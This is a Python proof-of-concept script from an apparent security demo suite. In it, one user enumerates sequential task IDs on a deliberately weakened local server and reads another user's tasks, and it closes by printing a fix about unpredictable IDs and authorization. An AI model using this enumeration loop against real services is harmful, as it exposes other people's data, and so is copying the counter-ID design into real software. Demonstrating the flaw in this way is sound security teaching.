#!/usr/bin/env python3
"""PoC 2: weak counter handles reveal other callers' tasks.

The deliberately weak mode uses a database counter. The normal mode uses
secrets-generated random handles. Neither replaces required authorization.
Run automatically: python3 demo.py 2
"""
import re
from common import check_server, client_for, demo_args, expect, line, run_demo, task_from


def main():
    args = demo_args(__doc__)
    check_server(args, weak=True)
    call = client_for(args)
    print("Alice creates two tasks. Bob creates his own task and receives a seed handle.")
    victims = set()
    for note in ("invoice A", "invoice B"):
        task = task_from(call("tools/call", {
            "name": "make_invoice", "arguments": {"note": note},
        }, token="tok-alice"))
        victims.add(task["taskId"])
    seed = task_from(call("tools/call", {
        "name": "make_invoice", "arguments": {"note": "Bob's own invoice"},
    }, token="tok-bob"))["taskId"]
    match = re.fullmatch(r"task_(\d+)", seed)
    expect(match is not None, "Expected counter handles; restart the server with --weak-handles")
    last = int(match.group(1))
    expect(last <= 10000, "Choose a fresh store or run python3 demo.py 2 for a bounded scan")
    print(f"  Bob's own seed: {seed}")
    line()
    disclosed = set()
    for number in range(1, last + 1):
        guess = f"task_{number:04d}"
        result = call("tasks/get", {"taskId": guess}, token="tok-bob")
        task = result.get("task")
        if task and task.get("owner") != "bob":
            disclosed.add(guess)
            print(f"  {guess}: owner={task['owner']} tenant={task['tenant']}")
    expect(victims <= disclosed, "The scan did not disclose both of Alice's generated tasks")
    line()
    print(f"Observed: Bob enumerated {len(disclosed)} other callers' tasks; his own task is excluded.")
    print("FIX: generate unpredictable IDs AND authorize every task operation.")


if __name__ == "__main__":
    run_demo(main)
